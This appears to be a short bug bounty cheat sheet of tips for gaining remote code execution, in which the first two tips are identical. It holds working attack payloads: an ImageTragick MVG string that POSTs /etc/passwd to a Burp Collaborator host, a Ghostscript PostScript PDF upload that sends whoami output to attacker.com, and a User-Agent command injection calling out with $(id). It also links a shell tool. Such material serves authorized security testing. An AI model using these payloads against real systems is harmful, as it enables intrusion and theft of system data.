#                                       Finding RCE: Bug bounty Tips

## TIP-1

    If server only allows GET and POST method, then try adding “X-HTTP-Method -Override: PUT to achieve RCE via PUT method.
    
## TIP-2 

    If server only allows GET and POST method, then try adding “X-HTTP-Method -Override: PUT to achieve RCE via PUT method.
  
  
## TIP-3 

    Recon to RCE:
    Google "upload" site:”target" -> upload form -> ImageTragick MVG -> RCE

    PoC:
    push graphic-context viewbox 0 0 200 200 fill 'url(https://example.123 "|curl -d "@/etc/passwd" -X POST https://xxx.burpcollaborator.net/test1")' pop graphic-context
    

   [This Tool imgetragick get shell](https://github.com/vishwaraj101/imagetragick)
    
## TIP-4 

   [RCE on PDF upload:](https://twitter.com/huntmost/status/1192670565963911169)

    Content-Disposition: form-data; name="fileToUpload"; filename="pwn.pdf"
    Content-Type: application/pdf

    %!PS
    currentdevice null true mark /OutputICCProfile (%pipe%curl http://attacker.com/?a=$(whoami|base64) )
    .putdeviceparams
    quit
    
   [Hackerone report](https://hackerone.com/reports/403417)
   
## TIP-5 
```bash
    User-Agent: `curl - v http://BurpCollaborator.com$(id)`
 # Get command injection
 ```
   
   
   
   
   
